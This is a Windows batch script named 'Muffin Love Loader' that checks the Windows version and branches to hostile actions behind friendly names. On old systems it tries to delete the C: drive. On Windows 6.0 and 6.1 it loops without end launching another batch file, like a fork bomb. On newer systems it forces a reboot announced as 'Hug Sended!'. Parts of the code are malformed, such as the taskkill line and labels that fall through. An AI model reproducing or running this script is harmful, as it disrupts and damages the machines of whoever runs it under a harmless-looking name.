@echo off
title Muffin Love Loader
for /f "delims=" %%i in ('ver') do set _VER=%%i
set win_version=%_VER:~-9,3%
if "%win_version%"=="10.0" goto win2012
if "%win_version%"=="6.3" goto win2012
if "%win_version%"=="6.2" goto win2012
if "%win_version%"=="6.1" goto win2007
if "%win_version%"=="6.0" goto win2007
if "%win_version%"=="5.2" goto win2000early
if "%win_version%"=="5.1" goto win2000early
if "%win_version%"=="5.0" goto win9x
if "%win_version%"=="4.0" goto win9x
if "%win_version%"=="3.1" goto win9x
if "%win_version%"=="3.5" goto win9x
if "%win_version%"=="3.51" goto win9x
if "%win_version%"=="4.90" goto win9x
if "%win_version%"=="4.10" goto win9x
:win9x
DEL C:
verify
ver
chkdsk
:win2000early
\taskkill C:
verify
ver
chkdsk
:win2007
echo YAY!
start Hug Loader.bat
goto win2007
:win2012
shutdown.exe -r -t 13 -c "Hug Sended! Rebooting..."
